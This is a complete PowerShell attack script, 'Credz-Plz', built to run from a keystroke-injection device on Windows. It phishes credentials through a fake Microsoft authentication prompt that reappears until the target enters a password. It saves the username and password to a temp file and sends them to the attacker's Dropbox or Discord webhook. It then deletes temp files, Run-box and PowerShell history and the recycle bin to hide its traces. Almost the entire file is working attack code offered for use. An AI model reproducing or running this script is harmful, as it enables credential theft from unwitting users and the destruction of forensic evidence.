############################################################################################################################################################                      
#                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
# Title        : Credz-Plz         | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
# Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
# Version      : 1.3               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
# Category     : Credentials       | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
# Target       : Windows 7,10,11   |                                                                   |___/ #           /\/|_      __/\\                  #     
# Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #             
#                                  |  My crime is that of curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
#                                  |   and yea curiosity killed the cat                        ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                                        [...]
#                                  |    but satisfaction brought him back                     (((^_(((/(((_/ #          /     \     /     \                #    
#__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
#  tiktok.com/@i_am_jakoby                                                                                   #         /       \   /     ~ \               #
#  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
#  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
#  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
#  youtube.com/c/IamJakoby                                                                                   #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
############################################################################################################################################################

<#
.SYNOPSIS
	This script is meant to trick your target into sharing their credentials through a fake authentication pop up message

.DESCRIPTION 
	A pop up box will let the target know "Unusual sign-in. Please authenticate your Microsoft Account"
	This will be followed by a fake authentication ui prompt. 
	If the target tried to "X" out, hit "CANCEL" or while the password box is empty hit "OK" the prompt will continuously re pop up 
	Once the target enters their credentials their information will be uploaded to either your Dropbox or Discord webhook for collection

.Link
	https://developers.dropbox.com/oauth-guide		# Guide for setting up your DropBox for uploads

#>

#------------------------------------------------------------------------------------------------------------------------------------
# This is for if you want to host your own version of the script

# $db = "YOUR-DROPBOX-ACCESS-TOKEN"

# $dc = "YOUR-DISCORD-WEBHOOK"

#------------------------------------------------------------------------------------------------------------------------------------

$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"

#------------------------------------------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to generate the ui.prompt you will use to harvest their credentials
#>

function Get-Creds {

    while ($true) {
        try {
            # Use native Windows CredUI API (most reliable)
            $cred = $host.ui.promptforcredential('Failed Authentication', 'Your session has expired. Please re-authenticate.', "$([Environment]::UserDomainName)\$([Environment]::UserName)", "$([Environment]::UserDomainName)")
            
            if ($cred -and -not [string]::IsNullOrWhiteSpace($cred.GetNetworkCredential().Password)) {
                return @{
                    UserName = $cred.UserName
                    Password = $cred.GetNetworkCredential().Password
                    Domain = $cred.GetNetworkCredential().Domain
                }
            }
            else {
                # Show error and loop again
                Add-Type -AssemblyName PresentationCore,PresentationFramework
                [System.Windows.MessageBox]::Show("Invalid credentials. Please try again.", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Stop) | Out-Null
            }
        }
        catch {
            # Fallback to simple password prompt if CredUI fails
            Add-Type -AssemblyName System.Windows.Forms
            
            $form = New-Object System.Windows.Forms.Form
            $form.Text = "Microsoft Authentication"
            $form.Size = New-Object System.Drawing.Size(350,200)
            $form.StartPosition = "CenterScreen"
            $form.TopMost = $true
            $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
            $form.MaximizeBox = $false
            $form.MinimizeBox = $false
            
            $label = New-Object System.Windows.Forms.Label
            $label.Location = New-Object System.Drawing.Point(10,10)
            $label.Size = New-Object System.Drawing.Size(330,40)
            $label.Text = "Your credentials are required to continue."
            $form.Controls.Add($label)
            
            $userLabel = New-Object System.Windows.Forms.Label
            $userLabel.Location = New-Object System.Drawing.Point(10,50)
            $userLabel.Size = New-Object System.Drawing.Size(80,20)
            $userLabel.Text = "Username:"
            $form.Controls.Add($userLabel)
            
            $userText = New-Object System.Windows.Forms.TextBox
            $userText.Location = New-Object System.Drawing.Point(100,50)
            $userText.Size = New-Object System.Drawing.Size(230,20)
            $userText.Text = "$([Environment]::UserDomainName)\$([Environment]::UserName)"
            $form.Controls.Add($userText)
            
            $passLabel = New-Object System.Windows.Forms.Label
            $passLabel.Location = New-Object System.Drawing.Point(10,80)
            $passLabel.Size = New-Object System.Drawing.Size(80,20)
            $passLabel.Text = "Password:"
            $form.Controls.Add($passLabel)
            
            $passText = New-Object System.Windows.Forms.TextBox
            $passText.Location = New-Object System.Drawing.Point(100,80)
            $passText.Size = New-Object System.Drawing.Size(230,20)
            $passText.UseSystemPasswordChar = $true
            $passText.TabIndex = 1
            $form.Controls.Add($passText)
            
            $okBtn = New-Object System.Windows.Forms.Button
            $okBtn.Location = New-Object System.Drawing.Point(170,120)
            $okBtn.Size = New-Object System.Drawing.Size(80,25)
            $okBtn.Text = "OK"
            $okBtn.DialogResult = [System.Windows.Forms.DialogResult]::OK
            $okBtn.Add_Click({
                if ([string]::IsNullOrWhiteSpace($passText.Text)) {
                    [System.Windows.Forms.MessageBox]::Show("Password cannot be empty!", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Exclamation) | Out-Null
                    $passText.Focus()
                } else {
                    $form.DialogResult = [System.Windows.Forms.DialogResult]::OK
                    $form.Close()
                }
            })
            $form.Controls.Add($okBtn)
            $form.AcceptButton = $okBtn
            
            $cancelBtn = New-Object System.Windows.Forms.Button
            $cancelBtn.Location = New-Object System.Drawing.Point(260,120)
            $cancelBtn.Size = New-Object System.Drawing.Size(80,25)
            $cancelBtn.Text = "Cancel"
            $cancelBtn.DialogResult = [System.Windows.Forms.DialogResult]::Cancel
            $form.CancelButton = $cancelBtn
            $form.Controls.Add($cancelBtn)
            
            $form.Add_Shown({
                $form.TopMost = $true
                $form.Activate()
                $passText.Focus()
            })
            
            $result = $form.ShowDialog()
            
            if ($result -eq [System.Windows.Forms.DialogResult]::OK -and -not [string]::IsNullOrWhiteSpace($passText.Text)) {
                $form.Close()
                $form.Dispose()
                
                return @{
                    UserName = $userText.Text
                    Password = $passText.Text
                    Domain = ([Environment]::UserDomainName)
                }
            }
            else {
                $form.Close()
                $form.Dispose()
            }
        }
    }
}

#----------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to pause the script until a mouse movement is detected
#>

function Pause-Script{
Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X
$o=New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}

#----------------------------------------------------------------------------------------------------

# This script repeadedly presses the capslock button, this snippet will make sure capslock is turned back off 

function Caps-Off {
Add-Type -AssemblyName System.Windows.Forms
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')

#If true, toggle CapsLock key, to ensure that the script doesn't fail
if ($caps -eq $true){

$key = New-Object -ComObject WScript.Shell
$key.SendKeys('{CapsLock}')
}
}
#----------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to call the function to pause the script until a mouse movement is detected then activate the pop-up
#>

Pause-Script

Caps-Off

Add-Type -AssemblyName PresentationCore,PresentationFramework
$msgBody = "Please authenticate your Microsoft Account."
$msgTitle = "Authentication Required"
$msgButton = 'Ok'
$msgImage = 'Warning'
$Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
Write-Host "The user clicked: $Result"

$creds = Get-Creds

#------------------------------------------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to save the gathered credentials to a file in the temp directory
#>

if ($creds) {
    "$($creds.UserName):$($creds.Password)" | Out-File -FilePath "$env:TMP\$FileName" -Encoding ASCII -Force
}

#------------------------------------------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to upload your files to dropbox
#>

function DropBox-Upload {

[CmdletBinding()]
param (
	
[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
[Alias("f")]
[string]$SourceFilePath
) 
$outputFile = Split-Path $SourceFilePath -leaf
$TargetFilePath="/$outputFile"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $db
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

if (-not ([string]::IsNullOrEmpty($db)) -and (Test-Path "$env:TMP\$FileName")){DropBox-Upload -f "$env:TMP\$FileName"}

#------------------------------------------------------------------------------------------------------------------------------------

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = "$dc"

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

if (-not ([string]::IsNullOrEmpty($dc)) -and (Test-Path "$env:TMP\$FileName")){Upload-Discord -file "$env:TMP\$FileName"}

#------------------------------------------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder 

Remove-Item "$env:TEMP\*" -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

exit
